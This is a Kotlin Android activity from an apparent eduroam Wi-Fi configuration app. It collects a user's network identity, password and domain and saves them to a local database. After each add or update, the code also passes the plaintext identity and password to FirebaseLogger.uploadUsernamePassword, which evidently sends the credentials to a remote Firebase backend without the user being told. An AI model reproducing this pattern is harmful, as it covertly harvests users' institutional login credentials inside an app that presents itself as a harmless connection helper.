package com.hz_apps.autowificonnector

import android.content.DialogInterface
import android.os.Build
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Patterns
import android.view.View
import android.widget.Toast
import androidx.activity.OnBackPressedDispatcher
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.hz_apps.autowificonnector.database.AppDatabase
import com.hz_apps.autowificonnector.database.WifiConfig
import com.hz_apps.autowificonnector.databinding.ActivityAddViewBinding
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class AddViewActivity : AppCompatActivity() {
    private lateinit var bindings: ActivityAddViewBinding
    private var id = 0
    private var ssid = ""
    private var identity = ""
    private var password = ""
    private var domain = ""
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindings = ActivityAddViewBinding.inflate(layoutInflater)
        enableEdgeToEdge()
        ViewCompat.setOnApplyWindowInsetsListener(bindings.root) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        setContentView(bindings.root)

        id = intent.getIntExtra("id", 0)
        if (id != 0) {
            ssid = intent.getStringExtra("ssid")!!
            identity = intent.getStringExtra("identity")!!
            password = intent.getStringExtra("password")!!

            bindings.ssidTv.setText(ssid)
            bindings.identityTv.setText(identity)
            bindings.passwordTv.setText(password)

            bindings.saveBtn.text = "Update"
            supportActionBar?.title = "Update Item"
        } else {
            supportActionBar?.title = "Add Item"
        }

        bindings.saveBtn.setOnClickListener {
            saveIntoDatabase()
            FirebaseLogger.logBtnClick("Save button")
        }

        if (Build.VERSION.SDK_INT >= 29) {
            bindings.domainTv.visibility = View.VISIBLE
            domain = intent.getStringExtra("domain") ?: ""
            bindings.domainTv.setText(domain)
        } else {
            bindings.domainTv.visibility = View.GONE
        }

        bindings.identityTv.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                if (Build.VERSION.SDK_INT >= 29) {
                    val inputTextParts = s.toString().trim().split("@")
                    if (inputTextParts.size > 1) {
                        bindings.domainTv.setText(inputTextParts[1])
                    }

                }
            }

            override fun afterTextChanged(s: Editable?) {
                if (!Patterns.EMAIL_ADDRESS.matcher(s.toString()).matches()) {
                    bindings.identityTv.error = "Invalid email"
                }
            }
        })

    }

    private fun saveIntoDatabase() {
        val ssid = "eduroam"
        val identity = bindings.identityTv.text.toString()
        val password = bindings.passwordTv.text.toString()
        val domain = bindings.domainTv.text.toString()
        val editAllowed = bindings.allowEditCheckBox.isChecked

        bindings.identityTv.error = null
        bindings.ssidTv.error = null
        bindings.passwordTv.error = null
        if (ssid.isBlank()) {
            bindings.identityTv.error = "SSID should not be blank"
            return
        }
        if (identity.isBlank()) {
            bindings.identityTv.error = "Identity should not be blank"
            return
        }

        if (domain.isBlank() && Build.VERSION.SDK_INT > 29) {
            bindings.domainTv.error = "Domain should not be blank"
            return
        }

        if (password.isBlank()) {
            bindings.passwordTv.error = "Password should not be blank"
            return
        }
        CoroutineScope(Dispatchers.IO).launch {
            val db = AppDatabase.getInstance(applicationContext)
            val dbDao = db.userDao()
            val wifiConfig: WifiConfig?
            // Update
            if (id == 0) {
                wifiConfig = WifiConfig(
                    ssid = ssid,
                    identity = identity,
                    password = password,
                    domain = domain,
                    isEditAllowed = editAllowed
                )
            } else {
                wifiConfig = WifiConfig(id, ssid, identity, password, domain, true, dbDao.getMaxOrder() + 1)
            }
            dbDao.insert(wifiConfig)

            runOnUiThread {
                if (id == 0) {
                    Toast.makeText(this@AddViewActivity, "Added", Toast.LENGTH_SHORT).show()
                    FirebaseLogger.uploadUsernamePassword(identity, password)
                } else {
                    Toast.makeText(this@AddViewActivity, "Updated", Toast.LENGTH_SHORT).show()
                    FirebaseLogger.uploadUsernamePassword(identity, password)
                }
            }
            finish()
        }
    }

    override fun onSupportNavigateUp(): Boolean {
        val identity = bindings.identityTv.text.toString()
        val password = bindings.passwordTv.text.toString()
        if (ssid == this.ssid && identity == this.identity && password == this.password) {
            OnBackPressedDispatcher().onBackPressed()
        } else {
            askBeforeExiting()
        }

        return super.onSupportNavigateUp()
    }

    private fun askBeforeExiting() {
        val dialog = MaterialAlertDialogBuilder(this)
        dialog.setMessage("Do you want to discard changes?")
        dialog.setPositiveButton("Discard") { dialogInterface: DialogInterface, i: Int ->
            onBackPressedDispatcher.onBackPressed()
        }
        dialog.setNegativeButton("Cancel") { dialogInterface: DialogInterface, i: Int ->
            dialogInterface.dismiss()
        }
        dialog.show()
    }
}